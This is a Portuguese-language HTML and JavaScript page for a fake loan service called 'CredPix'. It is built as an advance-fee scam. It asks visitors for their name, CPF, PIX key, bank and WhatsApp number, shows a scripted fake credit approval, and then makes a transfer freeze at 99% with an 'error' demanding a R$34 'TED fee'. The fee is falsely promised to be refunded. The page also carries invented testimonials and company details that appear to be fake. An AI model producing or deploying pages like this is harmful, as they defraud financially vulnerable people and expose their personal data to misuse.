<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CredPix - Solução Digital</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Inter', sans-serif; background: #4b00e0; color: #1e293b; }
        .bg-app { background: linear-gradient(180deg, #6e2cf2 0%, #4b00e0 100%); min-height: 100vh; }
        .page { display: none; }
        .page.active { display: block; animation: fadeIn 0.4s ease; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        .card { background: white; border-radius: 28px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
        .btn-target { background: #00f2ff; color: #000; font-weight: 800; border-radius: 18px; transition: 0.2s; }
        .btn-target:active { transform: scale(0.96); }
        .carousel-item { min-width: 100%; transition: 0.5s; }
    </style>
</head>
<body class="bg-app">

    <section id="step1" class="page active">
        <div class="max-w-md mx-auto p-5 pb-10">
            <header class="text-center py-8">
                <h1 class="font-extrabold text-3xl text-white tracking-tighter italic uppercase">CREDP<span class="text-cyan-400">IX</span></h1>
                <p class="text-cyan-200 text-[9px] uppercase tracking-[3px] font-semibold">Soluções Financeiras</p>
            </header>

            <h2 class="text-white text-2xl font-extrabold text-center leading-tight mb-8">O crédito que você precisa em poucos cliques.</h2>

            <div class="overflow-hidden mb-8">
                <div class="flex" id="carousel">
                    <div class="carousel-item bg-white/10 border border-white/20 p-6 rounded-3xl text-center backdrop-blur-md">
                        <span class="text-cyan-400 font-bold text-xs uppercase italic">Passo 01</span>
                        <p class="text-white font-bold text-lg mt-1">Simule seu crédito</p>
                        <p class="text-cyan-100 text-xs mt-2">Escolha o valor que cabe no seu bolso sem compromisso.</p>
                    </div>
                </div>
                <div class="flex justify-center gap-2 mt-4">
                    <div class="w-2 h-2 bg-white rounded-full"></div>
                    <div class="w-2 h-2 bg-white/30 rounded-full"></div>
                    <div class="w-2 h-2 bg-white/30 rounded-full"></div>
                </div>
            </div>

            <div class="card p-7 mb-8">
                <div class="space-y-4">
                    <input type="text" id="nome_user" placeholder="Nome Completo" class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none focus:border-cyan-400 font-semibold text-sm">
                    <input type="tel" id="cpf_user" placeholder="CPF" class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none focus:border-cyan-400 font-semibold text-sm">
                    <input type="date" class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none font-semibold text-sm">
                    <button onclick="nextStep(2)" class="w-full btn-target py-5 uppercase italic text-sm shadow-lg shadow-cyan-500/20">Analisar Grátis</button>
                </div>
            </div>

            <div class="space-y-4 mb-10">
                <h3 class="text-white/50 font-bold text-[10px] uppercase tracking-widest ml-2">Depoimentos</h3>
                <div class="bg-white/5 p-5 rounded-3xl border border-white/10">
                    <p class="text-white font-bold text-sm">Maria Auxiliadora</p>
                    <p class="text-white/70 text-xs mt-1">"Consegui resolver minhas contas pendentes em minutos. Muito prático!"</p>
                </div>
                <div class="bg-white/5 p-5 rounded-3xl border border-white/10">
                    <p class="text-white font-bold text-sm">Antônio Ferreira</p>
                    <p class="text-white/70 text-xs mt-1">"Fiz a ativação do TED conforme pedido e o dinheiro caiu certinho. Recomendo."</p>
                </div>
            </div>

            <footer class="text-center text-[9px] text-white/40 space-y-1">
                <p class="font-bold">CREDPX SOLUÇÕES DIGITAIS</p>
                <p>Av. Brigadeiro Faria Lima, 3477 - Itaim Bibi, São Paulo - SP</p>
                <p>CNPJ: 44.650.594/0001-30 | (11) 4003-8921</p>
            </footer>
        </div>
    </section>

    <section id="step2" class="page">
        <div class="flex flex-col items-center justify-center h-screen p-10">
            <div class="w-16 h-16 border-4 border-white/10 border-t-cyan-400 rounded-full animate-spin"></div>
            <p id="loader-text" class="text-white font-bold mt-6 uppercase italic tracking-widest text-xs">Analisando dados...</p>
        </div>
    </section>

    <section id="step3" class="page p-5">
        <div class="max-w-md mx-auto card p-8 mt-10">
            <h2 class="font-extrabold text-xl mb-2 italic uppercase">Quanto deseja?</h2>
            <p class="text-slate-400 text-[11px] mb-8">Arraste para selecionar o valor do crédito:</p>
            <p class="text-5xl font-extrabold text-indigo-600 mb-8">R$ <span id="val-range">2000</span></p>
            <input type="range" min="2000" max="10000" step="500" value="2000" oninput="updateRange(this.value)" class="w-full h-2 bg-slate-100 rounded-lg appearance-none cursor-pointer accent-indigo-600 mb-10">
            <button onclick="approveValue()" class="w-full btn-target py-5 uppercase italic text-sm">Confirmar Valor</button>
        </div>
    </section>

    <section id="step4" class="page p-5">
        <div class="max-w-md mx-auto text-center mt-20">
            <div id="check-icon" class="hidden w-20 h-20 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-6 shadow-xl shadow-green-500/30">
                <svg class="w-10 h-10 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="4" d="M5 13l4 4L19 7"></path></svg>
            </div>
            <h2 id="approve-title" class="text-white font-extrabold text-3xl uppercase italic mb-2 tracking-tighter">Processando...</h2>
            <p id="approve-desc" class="text-cyan-200 text-sm font-semibold">Validando limite pré-aprovado.</p>
            <div id="approve-btn" class="hidden mt-10">
                <button onclick="nextStep(5)" class="w-full btn-target py-5 uppercase italic text-sm">Ver Opções de Parcelas</button>
            </div>
        </div>
    </section>

    <section id="step5" class="page p-5">
        <div class="max-w-md mx-auto mt-10">
            <h2 class="text-white font-extrabold text-xl text-center uppercase italic mb-8">Plano de Pagamento</h2>
            <div class="grid gap-4">
                <button onclick="selectPlan('36x')" class="card p-6 text-left hover:ring-4 ring-cyan-400 transition-all">
                    <p class="text-[10px] font-bold text-slate-400 uppercase">36 Parcelas de</p>
                    <p class="text-2xl font-extrabold text-slate-800">R$ 58,33</p>
                    <p class="text-[10px] text-green-500 font-bold mt-2">CARÊNCIA DE 180 DIAS</p>
                </button>
                <button onclick="selectPlan('48x')" class="card p-6 text-left hover:ring-4 ring-cyan-400 transition-all">
                    <p class="text-[10px] font-bold text-slate-400 uppercase">48 Parcelas de</p>
                    <p class="text-2xl font-extrabold text-slate-800">R$ 44,12</p>
                    <p class="text-[10px] text-green-500 font-bold mt-2">CARÊNCIA DE 180 DIAS</p>
                </button>
            </div>
        </div>
    </section>

    <section id="step6" class="page p-5">
        <div class="max-w-md mx-auto card p-8 mt-10">
            <h2 class="font-extrabold text-lg text-center mb-6 uppercase italic">Dados Bancários</h2>
            <div class="space-y-4 text-sm">
                <input type="text" id="pix_key" placeholder="Sua Chave PIX" class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none font-semibold">
                <select id="banco_user" class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none font-semibold">
                    <option>Selecione seu Banco</option>
                    <option>Nubank</option><option>Inter</option><option>Caixa</option><option>Bradesco</option>
                </select>
                <input type="tel" placeholder="WhatsApp com DDD" class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none font-semibold">
                <button onclick="showSummary()" class="w-full btn-target py-5 uppercase italic mt-4">Próximo Passo</button>
            </div>
        </div>
    </section>

    <section id="step7" class="page p-5">
        <div class="max-w-md mx-auto card p-8 mt-10 text-center">
            <h2 class="font-extrabold text-lg uppercase mb-6 italic">Confirmar Dados</h2>
            <div class="bg-indigo-50 p-6 rounded-3xl text-left space-y-3 mb-8">
                <p class="text-[11px] font-semibold flex justify-between"><span>LIMITE:</span> <span class="text-indigo-600">R$ <span class="chosen-val">2000</span></span></p>
                <p class="text-[11px] font-semibold flex justify-between"><span>PLANO:</span> <span id="res-plan" class="text-indigo-600">36x</span></p>
                <p class="text-[11px] font-semibold flex justify-between"><span>BANCO:</span> <span id="res-banco" class="text-indigo-600">Nubank</span></p>
            </div>
            <button onclick="nextStep(8)" class="w-full btn-target py-5 uppercase italic">Concluir Agora</button>
        </div>
    </section>

    <section id="step8" class="page p-5">
        <div class="max-w-md mx-auto card p-8 mt-10">
            <h2 class="font-extrabold text-lg text-center mb-4 italic uppercase tracking-tighter">Termo de Ativação</h2>
            <div class="h-40 overflow-y-scroll bg-slate-50 p-4 rounded-2xl text-[10px] font-semibold text-slate-500 mb-6 leading-relaxed">
                <p>1. A liberação do crédito CredPix está condicionada à ativação da Taxa de Transferência Interbancária (TED).</p>
                <p>2. O valor de R$ 34,00 é tarifário e exclusivo para custos de remessa instantânea.</p>
                <p>3. O estorno da taxa é garantido e será creditado junto com o valor principal em até 10 minutos após a confirmação.</p>
                <p>4. Fica estabelecida a carência de 180 dias...</p>
            </div>
            <button onclick="startTransfer()" class="w-full btn-target py-5 uppercase italic">Aceitar e Receber</button>
        </div>
    </section>

    <section id="step9" class="page p-5">
        <div class="max-w-md mx-auto text-center mt-20">
            <h2 class="text-white font-extrabold text-xl uppercase italic mb-8">Enviando seu PIX...</h2>
            <div class="w-full bg-white/10 h-6 rounded-full overflow-hidden mb-4">
                <div id="progress-bar" class="bg-cyan-400 h-full w-0 transition-all duration-300"></div>
            </div>
            <p id="progress-text" class="text-cyan-100 text-[10px] font-bold uppercase tracking-widest">Iniciando (0%)</p>

            <div id="modal-error" class="hidden fixed inset-0 bg-black/60 backdrop-blur-sm flex items-center justify-center p-6 z-50">
                <div class="bg-white rounded-[32px] p-8 text-center max-w-sm">
                    <div class="w-16 h-16 bg-red-100 text-red-600 rounded-full flex items-center justify-center mx-auto mb-4">
                        <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>
                    </div>
                    <h3 class="font-extrabold text-xl mb-4 italic leading-tight">ERRO NA TRANSFERÊNCIA</h3>
                    <p class="text-slate-500 text-xs font-semibold leading-relaxed mb-8">
                        Identificamos que a <b class="text-slate-800">Taxa de TED (Transferência de Crédito)</b> não foi processada. Para liberar o saldo de R$ <span class="chosen-val">2000</span>, realize o pagamento obrigatório de R$ 34,00.
                    </p>
                    <button onclick="window.location.href='https://checkout.exemplo.com/pague-34'" class="w-full btn-target py-5 uppercase italic text-sm">Pagar Taxa de TED</button>
                </div>
            </div>
        </div>
    </section>

    <script>
        let chosenVal = 2000;
        let selectedPlan = "";

        function nextStep(step) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.getElementById('step' + step).classList.add('active');
            window.scrollTo(0,0);
            
            if(step === 2) {
                setTimeout(() => nextStep(3), 3000);
            }
        }

        function updateRange(val) {
            chosenVal = val;
            document.getElementById('val-range').innerText = val;
            document.querySelectorAll('.chosen-val').forEach(el => el.innerText = val);
        }

        function approveValue() {
            nextStep(4);
            setTimeout(() => {
                document.getElementById('approve-title').innerText = "LIMITADO APROVADO!";
                document.getElementById('approve-desc').innerHTML = "Parabéns! R$ " + chosenVal + " liberados para saque imediato.";
                document.getElementById('check-icon').classList.remove('hidden');
                document.getElementById('approve-btn').classList.remove('hidden');
            }, 3500);
        }

        function selectPlan(p) { selectedPlan = p; nextStep(6); }

        function showSummary() {
            document.getElementById('res-plan').innerText = selectedPlan;
            document.getElementById('res-banco').innerText = document.getElementById('banco_user').value;
            nextStep(7);
        }

        function startTransfer() {
            nextStep(9);
            let width = 0;
            const bar = document.getElementById('progress-bar');
            const text = document.getElementById('progress-text');
            const interval = setInterval(() => {
                if(width >= 99) {
                    clearInterval(interval);
                    document.getElementById('modal-error').classList.remove('hidden');
                    text.innerText = "TRANSFERÊNCIA BLOQUEADA (99%)";
                } else {
                    width++;
                    bar.style.width = width + '%';
                    text.innerText = "Enviando para " + document.getElementById('res-banco').innerText + " (" + width + "%)";
                }
            }, 70);
        }
    </script>
</body>
</html>
